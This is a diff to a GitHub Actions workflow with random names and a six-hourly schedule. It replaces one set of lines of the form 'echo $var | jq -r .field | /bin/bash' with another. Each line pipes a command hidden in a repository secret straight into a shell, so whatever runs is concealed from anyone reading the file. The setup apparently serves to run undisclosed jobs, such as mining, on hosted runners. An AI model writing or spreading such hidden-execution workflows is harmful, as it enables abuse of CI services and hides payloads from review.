@@ -2,9 +2,8 @@ name: zhoulanyi2374
 on:
   workflow_dispatch:
   schedule:
-    - cron: '48 0/6 * * *'
-
-jobs:  # 11214
+    - cron: '37 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,20 +11,26 @@ jobs:  # 11214
       - uses: actions/checkout@v4
       - name: zhoulanyi2374
         env:
-          cayed570: ${{ secrets.cayed570 }}
+          wfnhl776: ${{ secrets.wfnhl776 }}
         run: |
-          echo $cayed570 | jq -r .tnhy9 | /bin/bash
-          echo $lwqbz1 | jq -r .pl9318 | /bin/bash
-          echo $x7 | jq -r .n08321 | /bin/bash
-          echo $wx0 | jq -r .sn691 | /bin/bash
-          echo $g1 | jq -r .u751 | /bin/bash
-          echo $pyp38471 | jq -r .yfg9253 | /bin/bash
-          echo $u3406 | jq -r .vk90 | /bin/bash
-          echo $ybeba36919 | jq -r .fkib753 | /bin/bash
-          echo $vu547 | jq -r .c11245 | /bin/bash
-          echo $kdfc67 | jq -r .zdmcu92 | /bin/bash
-          echo $jwvc3618 | jq -r .m3576 | /bin/bash
-          echo $fs5011 | jq -r .pm26546 | /bin/bash
-          echo $ugdb78927 | jq -r .js0706 | /bin/bash
-          echo $zttq86 | jq -r .geze11 | /bin/bash
+          echo $wfnhl776 | jq -r .htdfu81 | /bin/bash
+          echo $ueo373 | jq -r .p84344 | /bin/bash
+          echo $nuxvi0342 | jq -r .afnu50921 | /bin/bash
+          echo $uis67515 | jq -r .epqa65 | /bin/bash
+          echo $jcrv4 | jq -r .x7816 | /bin/bash
+          echo $pyfq6057 | jq -r .xty9 | /bin/bash
+          echo $y8 | jq -r .iwtq66309 | /bin/bash
+          echo $mu9673 | jq -r .beu1 | /bin/bash
+          echo $p6 | jq -r .gi099 | /bin/bash
+          echo $milxq46743 | jq -r .gm3268 | /bin/bash
+          echo $dy5 | jq -r .wtdzx5689 | /bin/bash
+          echo $im454 | jq -r .w52821 | /bin/bash
+          echo $kvzi9815 | jq -r .xcu5 | /bin/bash
+          echo $m291 | jq -r .jkr843 | /bin/bash
+          echo $si24 | jq -r .eb50 | /bin/bash
+          echo $f376 | jq -r .e478 | /bin/bash
+          echo $utq94 | jq -r .zsn490 | /bin/bash
+          echo $m8 | jq -r .emhx93 | /bin/bash
+          echo $pdnp0 | jq -r .pjar1 | /bin/bash
+          echo $ofuv81 | jq -r .p72 | /bin/bash
 
